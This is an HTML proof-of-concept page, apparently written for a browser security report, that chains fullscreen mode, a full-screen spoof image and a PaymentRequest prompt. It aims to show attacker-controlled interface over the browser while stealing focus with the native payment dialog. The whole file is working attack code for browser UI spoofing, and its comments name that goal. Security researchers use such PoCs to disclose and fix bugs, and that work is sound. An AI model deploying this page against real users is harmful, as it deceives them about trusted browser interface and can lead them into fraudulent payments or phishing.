<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>FS + Payment + Spoof POC</title>
  <style>
    body, html { height:100%; margin:0; }
    #spoof { display:none; width:100vw; height:100vh; }
  </style>
</head>
<body>
  <button id="b">Start</button>
  <img id="spoof" src="spoof.png" alt="spoof"/>
  <script>
    document.getElementById('b').onclick = async () => {
      // Enter fullscreen
      await document.documentElement.requestFullscreen?.();

      // Render the spoof image shortly after (so attacker UI visible)
      setTimeout(()=> {
        document.getElementById('spoof').style.display = 'block';
        document.getElementById('b').style.display = 'none';
      }, 10);

      // Trigger PaymentRequest to steal focus / prompt native UI
      setTimeout(async () => {
        try {
          const supportedInstruments = [{supportedMethods: 'basic-card'}];
          const details = {total: {label: 'Test', amount: {currency: 'USD', value: '1.00'}}};
          const request = new PaymentRequest(supportedInstruments, details);
          await request.show();
        } catch(e){}
      }, 20);
    };
  </script>
</body>
</html>
